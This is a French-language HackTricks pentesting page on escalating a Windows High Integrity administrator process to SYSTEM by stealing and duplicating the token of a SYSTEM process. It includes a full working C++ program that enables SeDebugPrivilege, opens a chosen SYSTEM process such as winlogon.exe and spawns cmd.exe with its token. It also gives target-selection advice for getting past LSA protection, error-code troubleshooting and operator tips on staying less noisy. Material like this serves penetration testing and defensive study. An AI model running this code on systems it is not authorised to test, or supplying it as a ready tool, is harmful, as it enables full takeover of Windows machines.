# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Cette page concerne la version **manuelle** du passage d’un **processus administrateur à High Integrity** vers **`NT AUTHORITY\SYSTEM`** en **ouvrant un processus SYSTEM non protégé, en dupliquant son token, puis en lançant un processus enfant avec ce token**.

Si vous n’avez que **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** mais que vous **ne pouvez pas ouvrir un processus SYSTEM adapté**, la voie **Potato / named-pipe** est généralement plus fiable :

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Si ce que vous voulez n’est pas seulement `SYSTEM` mais un **token SYSTEM avec le plus de privilèges possible**, consultez aussi :

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Avant d’essayer de voler un token, validez rapidement le contexte :
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- Un jeton d’admin **High Integrity** suffit généralement pour **activer `SeDebugPrivilege`** et ouvrir de nombreux processus SYSTEM non protégés.
- **`CreateProcessWithTokenW` exige `SeImpersonatePrivilege`** chez l’appelant. Si cette API échoue avec `1314`, passe à `CreateProcessAsUserW` après avoir déjà dupliqué un jeton primaire SYSTEM.
- Sur les versions modernes de Windows, **`lsass.exe` est souvent une mauvaise cible** car **LSA protection / PPL** bloque l’accès même pour des administrateurs avec `SeDebugPrivilege`. Préfère **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, ou un **`svchost.exe`** précoce exécuté en tant que SYSTEM.
- Tous les processus SYSTEM n’ont pas un jeton également utile. Si tu obtiens SYSTEM mais constates des privilèges manquants, essaie un autre processus SYSTEM au lieu de supposer que la technique est cassée.

## Pick the PID carefully

La façon la plus simple de faire fonctionner cela de manière fiable est de **choisir un processus SYSTEM dont la DACL autorise réellement les Administrators à interroger le processus et à dupliquer son jeton**.

Bonnes cibles à tester en premier :

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- certaines instances `svchost.exe` précoces exécutées en tant que SYSTEM

À éviter par défaut :

- `lsass.exe` sur les hôtes où **RunAsPPL / LSA protection** est activé
- les processus protégés / sensibles à la sécurité qui renvoient `Access denied` même après activation de `SeDebugPrivilege`

Tu peux examiner les processus candidats et leurs jetons/ACL avec **Process Explorer** ou **Process Hacker** exécutés avec des privilèges élevés.

### Code

Le code suivant vient de [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Il permet **d’indiquer un Process ID en argument** et un CMD **exécuté comme l’utilisateur** du processus indiqué sera lancé.\
En l’exécutant dans un processus High Integrity, tu peux **indiquer le PID d’un processus exécuté en tant que System** (comme `winlogon`, `wininit`) et exécuter un `cmd.exe` en tant que SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / access-right notes

L'exemple utilise `MAXIMUM_ALLOWED`, mais pour de vraies opérations, il est utile de retenir les éléments minimaux impliqués :

- `OpenProcessToken()` require seulement que le **process handle** ait été ouvert avec **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Pour utiliser `CreateProcessWithTokenW()`, le **primary token handle** doit avoir **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` doit créer un **primary token** (`TokenPrimary`), pas seulement un impersonation token.
- Si vous avez déjà impersonated SYSTEM et que `CreateProcessWithTokenW()` échoue encore avec `1314`, essayez plutôt `CreateProcessAsUserW()`.

Cela signifie que **ouvrir le target process avec `PROCESS_ALL_ACCESS` est généralement inutile et plus bruyant** que de demander simplement les droits nécessaires pour query le token.

## Error

À certaines occasions, vous pouvez essayer d'impersonate System et cela ne fonctionnera pas, en affichant une sortie comme la suivante :
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Cela signifie que même si vous exécutez avec un niveau **High Integrity**, **vous n'avez pas assez de permissions** sur le processus/token cible.\
Vérifions les permissions d'Administrateur actuelles sur les processus `svchost.exe` avec **Process Explorer** (ou vous pouvez aussi utiliser **Process Hacker**) :

1. Sélectionnez un processus `svchost.exe`
2. Clic droit --> Properties
3. Dans l'onglet "Security", cliquez en bas à droite sur le bouton "Permissions"
4. Cliquez sur "Advanced"
5. Sélectionnez "Administrators" et cliquez sur "Edit"
6. Cliquez sur "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

L'image précédente contient tous les privilèges que "Administrators" ont sur le processus sélectionné (comme vous pouvez le voir, dans le cas de `svchost.exe`, ils n'ont que des privilèges de "Query")

Voici les privilèges "Administrators" ont sur `winlogon.exe` :

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Dans ce processus, "Administrators" peuvent "Read Memory" et "Read Permissions", ce qui permet probablement à Administrators d'usurper le token utilisé par ce processus.

### Causes courantes d'échec

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`** : la DACL du processus vous bloque, ou la cible est **protégée/PPL**. Choisissez un autre processus SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`** : votre handle de token a été ouvert sans assez de droits, ou la DACL du token cible empêche la duplication.
- **`CreateProcessWithTokenW()` -> `1314`** : l'appelant n'a actuellement pas **`SeImpersonatePrivilege`** activé. Essayez de l'activer d'abord ou utilisez `CreateProcessAsUserW()` avec le token primaire dupliqué.
- **`CreateProcessWithTokenW()` -> `1326`** après les échecs précédents : cela signifie souvent que l'étape précédente de duplication/usurpation du token a échoué, donc il n'y a pas de token primaire exploitable pour lancer le processus enfant.

## Notes pour l'opérateur

- Cette technique est idéale lorsque vous êtes déjà **local admin + high integrity** et que vous voulez simplement un chemin manuel rapide vers SYSTEM sans lancer un service ni une chaîne de coercion par named-pipe.
- Sur les environnements Windows 11 / Server durcis, **LSA protection** est de plus en plus courante, donc un workflow qui suppose que `lsass.exe` est toujours lisible est fragile. **`winlogon.exe` / `wininit.exe` / `services.exe` sont généralement de meilleurs premiers choix**.
- Si vous tombez dans un contexte de **service account** au lieu d'un bureau administrateur élevé, la famille **Potato** est généralement mieux adaptée que cette page.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
